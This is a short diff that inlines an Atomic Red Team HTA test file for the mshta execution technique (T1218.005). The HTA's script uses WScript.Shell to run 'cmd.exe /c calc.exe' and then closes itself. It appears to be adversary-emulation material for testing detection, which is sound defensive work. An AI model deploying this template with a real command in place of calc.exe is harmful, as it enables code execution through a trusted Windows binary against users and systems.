@@ -1,1 +1,12 @@
-https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta
+<html>
+<head>
+<HTA:APPLICATION ID="AtomicRedTeam">
+<script language="jscript">
+        var c = "cmd.exe /c calc.exe"; 
+        new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</head>
+<body>
+<script>self.close();</script>
+</body>
+</html>
